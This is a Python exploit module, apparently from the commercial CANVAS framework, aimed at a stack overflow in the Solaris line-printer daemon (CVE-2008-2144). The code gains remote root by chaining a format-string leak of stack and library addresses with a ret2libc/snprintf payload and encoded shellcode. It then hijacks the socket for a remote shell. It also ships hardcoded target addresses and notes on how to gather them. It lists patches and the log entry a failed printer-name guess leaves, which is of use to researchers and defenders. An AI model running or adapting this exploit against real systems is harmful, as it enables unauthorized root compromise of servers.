#! /usr/bin/env python
"""
sol_printer_conf.py

Stack overflow in Solaris printer configuration. Remote root,
assuming you know the printer name.
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

BUGS="""

"""
import sys
if "." not in sys.path: sys.path.append(".")


from exploitutils import *
from tcpexploit import tcpexploit
from shellcode import shellcodeGenerator
import timeoutsocket
from solarisNode import solarisNode
import solarisMosdefShellServer

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="5/9/2008"
DOCUMENTATION["Advisory"]="http://sunsolve.sun.com/search/document.do?assetkey=1-66-236884-1"
DOCUMENTATION["CVE Name"] = "CVE-2008-2144"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2144"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Notes"]="""

This exploit gets remote root on Solaris servers given a working printer
name. 

Resolved by:
SPARC Platform

    * Solaris 8 with patch 109320-20 or later
    * Solaris 9 with patch 113329-19 or later
    * Solaris 10 with patch 126672-02 or later

x86 Platform

    * Solaris 8 with patch 109321-20 or later
    * Solaris 9 with patch 114980-20 or later
    * Solaris 10 with patch 126673-02 or later
    
    Guessing the wrong printer gives a log message in /var/adm/messages
    Jun  4 12:00:56 unknown bsd-gw[1979]: [ID 937800 lpr.error] request to printer (unknown printer) from ::ffff:192.168.172.1


Locally:
cat /var/spool/lp/system/pstatus 

Will print out a list of printers. huhu2 is the printer name below:

+==========
huhu2
enabled accepting
1210965172 1210965198
new printer
new destination

"""

howto_repro = """

svcs | grep print

if disabled or offline:

svcadm enable svc:/application/print/server

than add a printer

/usr/sbin/lpadmin -p huhu -v /dev/null
/usr/bin/enable huhu
/usr/bin/accept huhu

now printer named "huhu" is ready

HOWTO GATHER ADDIES:

all addies are from the in.lpd binary so should be uber reliable!
rwx addie is leaked to the wire using the fprintf teqneek!
   
/usr/ccs/bin/elfdump /usr/lib/print/in.lpd | grep main | head -1
    [53] 0x08052045 <-- THIS ONE....

main_addr = 0x08052045

/usr/ccs/bin/dis -Fmain /usr/lib/print/in.lpd | grep fprintf | head -1
    main+0x10c <-- THIS ONE ...

fprintf_disp = 0x10c

/usr/ccs/bin/elfdump /usr/lib/print/in.lpd | grep environ | head -1
    [22] 0x080641b4 <-- THIS ONE
    
got_rw_addr = 0x080641b4

/usr/ccs/bin/elfdump /usr/lib/print/in.lpd | grep snprintf | head -1
    [22] 0x08051104 <-- THIS ONE

snprintf_plt_addr = 0x08051104

now create a struct under the GLOBALS below


Theoretically you can get to the IPP port (there's an ipplib.py
at http://www.daa.com.au/~james/files/ipplib.py) and get the
list of printer names like so:
 c=ipplib.CUPSServer("ipp://192.168.172.138/")
 for info in c.get_printer_info():
...    print info

This is failing on Solaris 10 for our test machines. It's possible
in some configurations this would work, perhaps?

I think the best bet for finding printer names is guessing (hp/etc)
or being local to the machine. 


"""


DESCRIPTION="Solaris printer configuration stack overflow"

VERSION="1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris"] ]
PROPERTY['VERSION'] = [ "10", "11" ]

NAME="sol_printer_conf"

target_crash = { "uname": "crash me",\
 "main_addr": 0x12345678, "fprintf_disp": 0x10c, "got_rw_addr": 0x87654321, "snprintf_plt_addr": 0x08080808, "shellcode":"\xcc"*100}
          
target_i386 = {"uname": "SunOS unknown 5.10 Generic_118855-36 i86pc i386 i86pc",\
 "main_addr": 0x08052045, "fprintf_disp": 0x10c, "got_rw_addr": 0x080641b4, "snprintf_plt_addr": 0x08051104}

targets = [target_i386]

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(515)
        #shellcode cannot have %
        self.badstring      = "\x00\x0a\x0d\x20\x25"
        self.addr_badstring = "\x00\x0a\x0d\x20"
        self.name           = NAME
        self.printer        = "printer"

    def getargs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        self.getarg("printer")
    
    def createShellcode(self):
        if self.version==0:
            fd=0 #stdin
            sc = shellcodeGenerator.solaris_X86()
            sc.addAttr("known_fd_read_and_exec", { 'fd' : fd })
            shellcode=sc.get()
            shellcode=self.intel_encode(self.badstring, shellcode)
            if shellcode==None:
                self.log("Could not create shellcode!")
                return False 
            self.shellcode=shellcode
            return self.shellcode
            
        return False 
    
    def test(self):
        """
        Right now we just test for port 23 - we'll add a check for
        Solaris later.
        """
        self.getargs()
        #result=self.osdetect(self.host)
        #if result.os=="Solaris":
        #...
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s'%(self.port))
            return 0
        s.close()
        return 1

    def do_hello(self):
        self.sck.send("\x02" + self.printer + "\n")
        ack = self.sck.recv(1)
        if ack != "\x00":
            self.sck.close()
            self.log("Initial handshake failed! most likely an invalid printer name")
            return False 
        return True 
    
    def do_prep_cf_infoleak(self, got_rw_addr, got_rw_addr2, EIP):

        #CTRL
        cf_data = "%.8x-"*200 + "\n"
        cf_data += ("O" + "A"*1024 + "\n")
        cf_data += ("O" + "A"*1024 + "\n")
      
        COLOR_CNT = 15
        padding = "12"
        
        color = padding + reduce(lambda x, y: x + struct.pack("BBBB", y, y, y, y), range(0x41, (0x41+COLOR_CNT-1)), "")
        
        #this has to point to "a pointer to a pointer" followed by 0
        color = color.replace("\x4c\x4c\x4c\x4c", struct.pack("<L", got_rw_addr)) #0xd28f02a8))
        color = color.replace("\x4d\x4d\x4d\x4d", struct.pack("<L", got_rw_addr)) #0xd28f02a8))
        
        #need safe pointer values that point to 0x00000000 (make sure no "\n\t\x20" in addr!!!)
        #use in.lpd binary .data addie
        color = color.replace("\x45\x45\x45\x45", struct.pack("<L", got_rw_addr2))
        color = color.replace("\x46\x46\x46\x46", struct.pack("<L", got_rw_addr2))
        color = color.replace("\x4a\x4a\x4a\x4a", struct.pack("<L", got_rw_addr2))
        color = color.replace("\x4b\x4b\x4b\x4b", struct.pack("<L", got_rw_addr2))
        
        color += struct.pack("<L", EIP)
        
        cf_data += ("O" + color + "\n")
        
        return cf_data

    def do_prep_cf_ret2libc(self, got_rw_addr, got_rw_addr2, EIP, rwx_addr, payload_addr, shellcode):
 
        if shellcode.count("\x25") != 0: 
            raise Exception, "shellcode contains % char!"
        #CTRL
        cf_data = "B"*8 + "%x%x" + "A"*26 + shellcode + "\n"
        cf_data += ("O" + "A"*1024 + "\n") #("O" + "\x90"*(1024 - len(shellcode)) + shellcode + "\n")
        cf_data += ("O" + "A"*1024 + "\n")
        
        COLOR_CNT = 15
        padding = "12"
        
        color = padding + reduce(lambda x, y: x + struct.pack("BBBB", y, y, y, y), range(0x41, (0x41+COLOR_CNT-1)), "")
        
        #this has to point to "a pointer to a pointer" followed by 0
        color = color.replace("\x4c\x4c\x4c\x4c", struct.pack("<L", got_rw_addr))
        color = color.replace("\x4d\x4d\x4d\x4d", struct.pack("<L", got_rw_addr))
        
        #need safe pointer values that point to 0x00000000 (make sure no "\n\t\x20" in addr!!!)
        #use in.lpd binary .data addie
        color = color.replace("\x45\x45\x45\x45", struct.pack("<L", got_rw_addr2))
        color = color.replace("\x46\x46\x46\x46", struct.pack("<L", got_rw_addr2))
        color = color.replace("\x4a\x4a\x4a\x4a", struct.pack("<L", got_rw_addr2))
        color = color.replace("\x4b\x4b\x4b\x4b", struct.pack("<L", got_rw_addr2))
        
        color += struct.pack("<L", EIP)
        
        color += struct.pack("<L", rwx_addr + 32) #save eip
        color += struct.pack("<L", rwx_addr)      #rwx space
        color += struct.pack("<L", 0x01010101L)   #size value for snprintf
        color += struct.pack("<L", payload_addr)  #payload on stack
        color += struct.pack("<L", payload_addr)  #payload on stack
        color += struct.pack("<L", payload_addr)  #payload on stack
        
              
        cf_data += ("O" + color + "\n")
        
        return cf_data

    def do_xfer_cf(self, data):
        
        #request
        self.sck.send("\x02" + str(len(data)) + " cf" + str(abs(random.random()))[2:] + "\n")
        #cf data
        self.sck.send(data)
        ack = self.sck.recv(1)
        
        if ack != "\x00":
            self.sck.close()
            raise Exception, "printer did not accept the configuration file"
          
        self.sck.send("\x00")
        ack = self.sck.recv(1)
        return 
 
    def do_xfer_data(self, data):
        
        #raw_input("attach")
        
        self.sck.send("\x03" + str(len(data)) + " data" + str(abs(random.random()))[2:] + "\n")
        self.sck.send(data)
        ack = self.sck.recv(1)
        if ack != "\x00":
            self.sck.close()
            raise Exception, "printer did not accept the data file"
        
        self.sck.send("\x00")
        ack = self.sck.recv(1)
 
    def recvstuff(self):
        data="A"
        count=0
        ret=""
        while data!="" and count<10:
            data=self.sck.recv(5000)
            ret+=data 
            count+=1
        return ret 
    
    def do_trigger_infoleak(self):
        self.sck.send("\x02" + str(0) + " data" + str(abs(random.random()))[2:] + "\n")
         
        buf = self.recvstuff()
        #potential network problems!
        buf += self.recvstuff()
        buf += self.recvstuff()
        return buf
     
    def do_trigger_shell(self):
        
        #raw_input("hit key for trigger!")
        self.sck.send("\x02" + str(0) + " data" + str(abs(random.random()))[2:] + "\n")
        return 

    def run(self):
        """
        Actually exploit the target.
        """
        self.getargs()

        self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))
        self.log('Using version: %d' % self.version)
        
        target = targets[self.version]
        
        uname = target["uname"]
        self.log("attacking %s:%d (%s)" % (self.host, self.port, uname))
        
        #infoleak addie! ret to the push before call to fprintf the correct IOB is pushed at that addie
        fprintf_addr = target["main_addr"] + target["fprintf_disp"] - 5 #5 is to move up to the first push before call
     
        got_rw_addr = target["got_rw_addr"]
        got_rw_addr2 = got_rw_addr + 0x200
        
        snprintf_plt_addr = target["snprintf_plt_addr"]
     
        self.createShellcode()
        shellcode = self.shellcode
        
        #check for bad characters in all our addresses
        for each in [got_rw_addr, got_rw_addr2, fprintf_addr]:
            for bad in self.addr_badstring:
                if intel_order(each).count(bad):
                    self.log("Bad char in addr: %.8x" % each)
                    return 0
     
        self.sck=self.gettcpsock()
        self.sck.connect((self.host, self.port))
        if not self.do_hello():
            self.log("Failed to get correct printer name!")
            return 0
        data = self.do_prep_cf_infoleak(got_rw_addr, got_rw_addr2, fprintf_addr)
        self.do_xfer_cf(data)
        #raw_input("attach before infoleak")
        self.do_xfer_data(data = "blah blah\n")
     
        
        buf = self.do_trigger_infoleak()
        
        #close connection
        self.sck.close()
        
        l1 = buf.split("\n")
        l2 = l1[0].split("-")
        
        l3 = []
        for each in l2:
            if each != "":
                l3.append(int(each, 16))
        
        pointer_to_buffer = l3[3]
        if pointer_to_buffer & 0xff == 0x00:
            pointer_to_buffer += 8
           
        self.log("[-] from infoleak -> pointer to payload buffer @ %.8x" % pointer_to_buffer)
     
        #sort all library base addresses
        d1 = {}
        l4 = map( lambda x: x & 0xffff0000, filter(lambda x: x > 0xd0000000L and x < 0xf0000000L, l3))
        l4.sort()
        
        for each in l4:
            d1[each] = 0
        self.log("[|] library bases retrieved -> ")
        for each in d1.keys():
            self.log("%.8x " % each)
        
        #assume first addie is the rwx base
        rwx_addr = d1.keys()[0]
        rwx_addr = rwx_addr + 0x0108 #lets not have NULLs
     
        for each in [got_rw_addr, got_rw_addr2, snprintf_plt_addr, rwx_addr, pointer_to_buffer]:
            for bad in self.addr_badstring:
                if intel_order(each).count(bad):
                    self.log("Bad char in addr: %.8x" % each)
                    return 0
        
        self.log("[-] from infoleak -> rwx_addr: %.8x pointer_to_buffer: %.8x" % (rwx_addr, pointer_to_buffer))
        self.log("[|] sending exploit payload")
        self.sck=self.gettcpsock()
        self.sck.connect((self.host, self.port))
        self.do_hello()
        #raw_input("Attach...")
        data = self.do_prep_cf_ret2libc(got_rw_addr, got_rw_addr2, snprintf_plt_addr, rwx_addr, pointer_to_buffer, shellcode)
        self.do_xfer_cf(data)
        #raw_input("attach before exploit")
        self.do_xfer_data(data = "blah blah\n")
        self.log("[-] triggering shellcode")
        self.do_trigger_shell()
        result=self.sck.recv(4)
        if result=="GOOO":
            self.log("Shellcode worked and stole socket!")
            
            self.log("Shellcode running...")
            self.log("Initing Solaris Intel MOSDEF Node ...")
            node = solarisNode()
            self.parentnode = self.argsDict['passednodes'][0]
    
            node.parentnode = self.parentnode
            solarisMosdefShellServer.solarisx86shellserver(self.sck, node, logfunction = self.logfunction)
            node.startup()
            return node
        self.log("Failed to get shell. Patched?")
        return 0

    
#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
